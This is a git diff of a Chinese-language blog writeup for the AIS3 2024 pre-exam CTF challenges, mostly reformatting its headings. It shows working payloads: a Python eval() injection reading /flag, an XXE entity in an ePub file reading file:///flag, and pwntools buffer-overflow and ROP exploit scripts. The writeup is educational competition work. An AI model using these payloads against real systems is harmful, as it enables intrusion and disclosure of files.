@@ -5,78 +5,92 @@ date: 2024-8-10
 categories: [ais3, ctf, writeup]
 ---
 
-## Welcome
-
-### Solve
-
-打開題目就有 flag
-![image](/assets/images/AIS3-2024-pre-exam-writeup/welcome-solve.png)
-
-### Flag
-
-`AIS3{Welc0me_to_AIS3_PreExam_2o24!}`
-
-## Quantum Nim Heist
-
-### Vulnerability
-
-從 `server.py` 的 `play` 可以看到 `choice` 不等於 0, 1, 2 時會直接換 ai 下
-![image](/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-vulnerability.png)
-
-### Solve
-
-先隨意移動一次寫入 `count`, `pile` 之後 print 才不會 error
-![image](/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-solve-1.png)
-
-接著輸入 `3` 直到剩下一堆，拿走全部獲勝並取得 flag
-![image](/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-solve-2.png)
-
-### Flag
-
-`AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}`
-
-## Three Dimensional Secret
+# Welcome
 
 ## Solve
 
+打開題目就有 flag
+
+![image](/assets/images/AIS3-2024-pre-exam-writeup/welcome-solve.png)
+
+## Flag
+
+`AIS3{Welc0me_to_AIS3_PreExam_2o24!}`
+
+# Quantum Nim Heist
+
+## Vulnerability
+
+從 `server.py` 的 `play` 可以看到 `choice` 不等於 0, 1, 2 時會直接換 ai 下
+
+![image](/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-vulnerability.png)
+
+## Solve
+
+先隨意移動一次寫入 `count`, `pile` 之後 print 才不會 error
+
+![image](/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-solve-1.png)
+
+接著輸入 `3` 直到剩下一堆，拿走全部獲勝並取得 flag
+
+![image](/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-solve-2.png)
+
+## Flag
+
+`AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}`
+
+# Three Dimensional Secret
+
+# Solve
+
 隨意 follow 一個 tcp stream 看到封包在傳送 G-code
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/three-dimensional-secret-solve-1.png)
+
 使用[線上 G-code 模擬器](https://nraynaud.github.io/webgcode/)畫出 flag
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/three-dimensional-secret-solve-2.png)
 
-### Flag
+## Flag
 
 `AIS3{b4d1y_tun3d_PriN73r}`
 
-## Emoji Console
+# Emoji Console
 
-### Solve
+## Solve
 
 ``🐱 ⭐`` `cat *` 印出所有檔案看到 source code 及發現 `./flag` 
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/emoji-console-solve-1.png)
+
 `💿 🚩😜🤬 🐱 ⭐`  `cd flag;p#$%&! cat *` 進到 `./flag` 並印出所有檔案，找到 `flag-printer.py`
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/emoji-console-solve-2.png)
+
 `💿 🚩😜🤬 🐍 ⭐` `cd flag;p#$%&! python *` 執行 `flag-printer.py` 取得 flag
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/emoji-console-solve-3.png)
 
 
-### Flag
+## Flag
 
 `AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}`
 
+# Hash Guesser
 
-## Hash Guesser
-
-### Vulnerability
+## Vulnerability
 
 從 `app.py` 看到使用 `util.is_same_image` 比較圖片
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-vulnerability-1.png)
 
 trace source code 發現沒有比較大小的部份，猜測會才切成較小的圖片再比較，如此全黑或全白的 1\*1 照片有 1/2 機率正確
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-vulnerability-2.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-vulnerability-3.png)
 
-### Solve
+## Solve
 
 生成 1\*1 全黑的照片
 
@@ -86,37 +100,40 @@ image.putdata([0])
 image.save('img.png')
 ```
 多嘗試幾次後取得 flag
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-solve.png)
 
-### Flag
+## Flag
 
 `AIS3{https://github.com/python-pillow/Pillow/issues/2982}`
 
-## Evil Calculator
+# Evil Calculator
 
-### Vulnerability
+## Vulnerability
 
 在 `app.py` 中看到此計算機是用 `eval()` 來計算，所以可以注入 python 程式
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/evil-calculator-vulnerability.png)
 
-### Solve
+## Solve
 
 利用 burpsuite 攔截 request 將 `expression` 改成 `open('/flag').read()` 就成功取得 flag
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/evil-calculator-solve.png)
 
-### Flag
+## Flag
 
 `AIS3{7RiANG13_5NAK3_I5_50_3Vi1}`
 
-## Ebook Parser
+# Ebook Parser
 
 reference: [This book reads you - exploiting services and readers that support the ePub book format](https://s1gnalcha0s.github.io/epub/2017/01/25/This-book-reads-you.html)
 
-### Vulnerability
+## Vulnerability
 
 ebook metadata 是以 xml 形式紀錄所以嘗試使用 XXE 攻擊
 
-### Solve
+## Solve
 
 先用 python 新增簡單的 ebook file
 ```python
@@ -130,45 +147,55 @@ book.add_author("unicorn")
 
 epub.write_epub("test.epub", book, {})
 ```
+
 解壓縮 `test.epub`，編輯 `EPUB/content.opf` 注入 XXE payload 後再重新壓縮回 `test.epub`
+
 ```xml
 <!DOCTYPE data [<!ENTITY flag SYSTEM "file:///flag">]>
 ...
     <dc:title>&flag;</dc:title>
 ```
 上傳後成功取得 flag
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/ebook-parser-solve.png)
 
 
-### Flag
+## Flag
 
 `AIS3{LP#1742885: lxml no longer expands external entities (XXE) by default}`
 
-## The Long Print
+# The Long Print
 
-### Solve
+## Solve
 
 利用 ida 把 `sleep` 時間 patch 成 1 秒
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/the-long-print-solve-1.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/the-long-print-solve-2.png)
 
 執行程式並在 flag 消失前記下
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/the-long-print-solve-3.png)
 
-### Flag
+## Flag
 
 `AIS3{You_are_the_master_of_time_management!!!!?}`
 
-## 火拳のエース
+# 火拳のエース
 
-### Solve
+## Solve
 
 先利用 ida 把 `usleep` 時間 patch 成 1 秒
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-1.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-2.png)
 
 看出程式會將剩下的 flag 分為四個長度 8 的 stirng，並分別 `xor_strings`、`complex_function` 每個字元後必須與 `"DHLIYJEG", "MZRERYND", "RUYODBAH", "BKEMPBRE"` 相同
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-3.png)
+
 在 gdb 設定 break point 於 `xor_strings` 找出 flag 會 xor 的 string，分別為：
 
 first: `0xe     0xd     0x7d    0x6     0xf     0x17    0x76    0x4`
@@ -177,6 +204,7 @@ third: `0x1e    0x7e    0x6     0x13    0x7     0x66    0xe     0x71`
 forth: `0x17    0x14    0x1d    0x70    0x79    0x67    0x74    0x33`
 
 最後依照 ida 的 pseudo code 用 python 寫出，並 brute force 出 xor 後的字元，再與前面找出的 xor string 進行 xor 就得到 flag
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-4.png)
 
 
@@ -220,24 +248,26 @@ print("AIS3{G0D" + "".join(flag))
 AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}
 ```
 
-### Flag
+## Flag
 
 `AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}`
 
-## faker's Really OP meow way
+# faker's Really OP meow way
 
-### Solve
+## Solve
 
 使用 ida 把生成亂數的檔案從 `/dev/urandom` 改成自行生成全為 `\x00` 的 `randomnumber`
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-1.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-2.png)
 
 先將 `flag.txt` 寫為 `AIS3{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}` 作為 placeholder
 
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-3.png)
 
-
 在 `memcmp` 設定 break point 以 dump 記憶體，觀察發現正確的字元會顯示 `0x00`，接著使用 python 輔助將還沒解出的字元全部改為某個測試字元，藉此手動比較 `memcpy` 的記憶體來 brute force 直到所有結果皆為 `0x00` 為止
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-4.png)
 
 ```python
@@ -251,21 +281,28 @@ for i in range(48):
 print(flag)
 ```
 
-### Flag
+## Flag
 
 `AIS3{r3v3r51n6_r0p_15_c00l_r16h7???}`
 
-## PixelClicker_Revenge
+# PixelClicker_Revenge
 
-### Solve
+## Solve
 
 在 x64dbg 找到會跳到 `FAIL\n` 的兩個判斷位置，設定 break point 後，根據提示多次嘗試發現為點擊位置的 x, y 座標
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-1.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-2.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-3.png)
+
 接著將會比較範圍的 memory dump 出來，結束的值從 ida 可以簡單看出
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-4.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-5.png)
+
 接著用 python 畫出所有的點就得到 flag
 
 ```python
@@ -292,18 +329,19 @@ flag.save("flag.jpg")
 
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-6.jpg)
 
-### Flag
+## Flag
 
 `AIS3{nOw_Ur_A_p4int3r_M4steR}`
 
-## babyRSA
+# babyRSA
 
-### Vulnerability
+## Vulnerability
 
 `encrypt` 可以看到每次都只會加密一個字元，因此將所有字元都用相同 key encrypt 建表後，對照就能得到 flag
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/babyrsa-vulnerability.png)
 
-### Solve
+## Solve
 
 ```python
 from babyRSA import encrypt
@@ -324,20 +362,21 @@ print(flag)
 
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/babyrsa-solve.png)
 
-### Flag
+## Flag
 
 `AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}`
 
-## Mathter
+# Mathter
 
-### Vulnerability
+## Vulnerability
 
 在 ghidra 中看到可以透過 `gets` 來 buffer overflow，且 NX enable 所以要使用 rop chain
 
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/mather-vulnerability-1.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/mather-vulnerability-2.png)
 
-### Solve
+## Solve
 
 ```python
 from pwn import *
@@ -397,22 +436,26 @@ p.interactive()
 
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/mather-solve.png)
 
-### Flag
+## Flag
 
 `AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}`
 
-## Base64 Encoder
+# Base64 Encoder
 
-### Solve
+## Solve
 
 從 `main` 可以看到 `scanf` 沒有限制長度可以 buffer overflow
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-1.png)
 
 從 gdb 看出要 pad 0x48 個字元才能蓋到 rbp
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-2.png)
 
 從 `base64_encoding` 看出可以讓 `table` 的 index 變成負的來 leak address，gdb break 在 `base64_encoding` 找出 `table` 前面的 address 為 `main+299`
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-3.png)
+
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-4.png)
 
 ```python
@@ -472,6 +515,6 @@ p.interactive()
 
 ![image](/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-5.png)
 
-### Flag
+## Flag
 
 `AIS3{1_g0t_WA_on_my_H0m3work_Do_YoU_h4v3_aNY_idea???_22281a41372450db}`
